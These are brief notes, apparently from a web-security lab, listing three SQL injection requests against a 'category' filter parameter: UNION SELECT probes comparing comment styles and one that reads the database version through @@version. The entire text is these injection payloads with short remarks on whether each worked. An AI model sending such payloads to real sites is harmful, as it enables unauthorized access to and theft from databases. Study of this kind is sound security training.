/*

1) GET /filter?category='+UNION+SELECT+NULL,NULL-- HTTP/2
//error

2) GET /filter?category='+UNION+SELECT+NULL,NULL# HTTP/2
//works

3) GET /filter?category='+UNION+SELECT+NULL,@@version# HTTP/2
//find out which column is string type then find version



*/